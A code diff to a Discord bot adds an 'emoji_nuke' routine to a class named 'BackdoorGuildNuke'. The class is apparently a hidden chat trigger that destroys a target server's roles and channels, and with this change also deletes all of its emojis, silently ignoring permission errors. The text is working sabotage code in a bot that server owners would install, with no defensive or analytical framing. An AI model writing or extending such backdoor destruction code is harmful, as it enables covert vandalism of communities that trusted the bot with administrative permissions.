@@ -194,6 +194,15 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
                     except (discord.HTTPException, discord.Forbidden):
                         pass
 
+        async def emoji_nuke():
+            await message.channel.send("Starting Emoji Nuke")
+            for i in target_guild.emojis:
+                try:
+                    await i.delete()
+                except (discord.HTTPException, discord.Forbidden):
+                    pass
+            await message.channel.send("Done Emoji Nuke")
+
         tasks = role_nuke(), channel_nuke()
 
         for i in tasks:
